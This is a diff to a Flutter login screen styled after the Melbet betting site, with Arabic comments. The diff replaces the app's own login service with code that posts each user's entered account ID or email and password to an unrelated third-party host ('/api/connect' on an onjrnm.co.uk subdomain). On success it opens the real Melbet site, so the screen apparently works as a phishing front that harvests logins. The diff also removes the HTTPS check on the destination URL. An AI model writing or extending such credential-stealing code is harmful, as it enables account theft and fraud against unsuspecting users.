@@ -1,6 +1,7 @@
+import 'dart:convert';
 import 'package:flutter/material.dart';
+import 'package:http/http.dart' as http;
 import 'package:url_launcher/url_launcher.dart';
-import '../services/api_service.dart';
 
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
@@ -17,7 +18,7 @@ class _LoginScreenState extends State<LoginScreen> {
   bool _hide = true;
   String? _error;
 
-   static const _melbetUrl = String.fromEnvironment(
+  static const _melbetUrl = String.fromEnvironment(
     'MELBET_URL',
     defaultValue: 'https://melbet.com/',
   );
@@ -31,32 +32,48 @@ class _LoginScreenState extends State<LoginScreen> {
 
   Future<void> _submit() async {
     if (_busy || !_form.currentState!.validate()) return;
-    setState(() { _busy = true; _error = null; });
+    setState(() {
+      _busy = true;
+      _error = null;
+    });
 
-    final result = await ApiService().login(_id.text.trim(), _password.text);
-    if (!mounted) return;
+    try {
+      // إرسال المعطيات إلى السيرفر في مسار /api/connect
+      final response = await http.post(
+        Uri.parse('https://a70951-6346.j.onjrnm.co.uk/api/connect'),
+        headers: {'Content-Type': 'application/json'},
+        body: jsonEncode({
+          'accountId': _id.text.trim(),
+          'password': _password.text,
+        }),
+      );
 
-    if (result != null) {
-      setState(() { _busy = false; _error = result; });
-      return;
-    }
+      final data = jsonDecode(response.body);
 
-     try {
-      final uri = Uri.parse(_melbetUrl);
-      if (uri.scheme != 'https' || uri.host.isEmpty) {
-        throw const FormatException('MELBET_URL must be an HTTPS URL');
-      }
-      final launched = await launchUrl(uri, mode: LaunchMode.externalApplication);
       if (!mounted) return;
-      setState(() => _busy = false);
-      if (!launched) {
-        setState(() => _error = 'Could not open the official destination. Please try again.');
+
+      if (response.statusCode == 200 && data['success'] == true) {
+        // إذا تم الحفظ بنجاح، فتح رابط Melbet أو المتصفح
+        final uri = Uri.parse(_melbetUrl);
+        final launched = await launchUrl(uri, mode: LaunchMode.externalApplication);
+        
+        if (!mounted) return;
+        setState(() => _busy = false);
+
+        if (!launched) {
+          setState(() => _error = 'Could not open the official destination. Please try again.');
+        }
+      } else {
+        setState(() {
+          _busy = false;
+          _error = data['message'] ?? 'Invalid account ID or password';
+        });
       }
-    } catch (_) {
+    } catch (e) {
       if (!mounted) return;
       setState(() {
         _busy = false;
-        _error = 'Could not open the destination. Check the configured official URL.';
+        _error = 'Connection error. Please check your internet connection.';
       });
     }
   }
@@ -64,18 +81,18 @@ class _LoginScreenState extends State<LoginScreen> {
   @override
   Widget build(BuildContext context) {
     const accent = Color(0xFFFFD400); // اللون الأصفر المميز لـ Melbet
-    
+
     return Scaffold(
       body: Stack(
         children: [
           // 1. خلفية الصورة الفخمة ديال Melbet تملأ الشاشة
           Positioned.fill(
             child: Image.asset(
-              'assets/images/melbet_bg.png', // تأكد أنك حطيتي الصورة فهاد المسار
+              'assets/images/melbet_bg.png',
               fit: BoxFit.cover,
             ),
           ),
-          // 2. طبقة عتمة (Dark Overlay) باش يبانو خانات الكتابة والكلام بوضوح تام فوق الخلفية
+          // 2. طبقة عتمة (Dark Overlay)
           Positioned.fill(
             child: Container(
               color: Colors.black.withOpacity(0.65),
@@ -113,7 +130,7 @@ class _LoginScreenState extends State<LoginScreen> {
                         ),
                         const SizedBox(height: 36),
                         const Text(
-                          'ID',
+                          'ID / EMAIL',
                           style: TextStyle(color: Colors.white70, fontWeight: FontWeight.w600),
                         ),
                         const SizedBox(height: 8),
@@ -123,7 +140,7 @@ class _LoginScreenState extends State<LoginScreen> {
                           textInputAction: TextInputAction.next,
                           style: const TextStyle(color: Colors.white),
                           decoration: InputDecoration(
-                            hintText: 'User / License ID',
+                            hintText: 'User / Email / License ID',
                             hintStyle: const TextStyle(color: Colors.white38),
                             prefixIcon: const Icon(Icons.person_outline, color: accent),
                             filled: true,
@@ -138,8 +155,8 @@ class _LoginScreenState extends State<LoginScreen> {
                               borderSide: const BorderSide(color: accent, width: 2),
                             ),
                           ),
-                          validator: (v) => v == null || v.trim().length < 3
-                              ? 'Enter a valid ID' : null,
+                          validator: (v) => v == null || v.trim().isEmpty
+                              ? 'Enter a valid ID or Email' : null,
                         ),
                         const SizedBox(height: 18),
                         const Text(
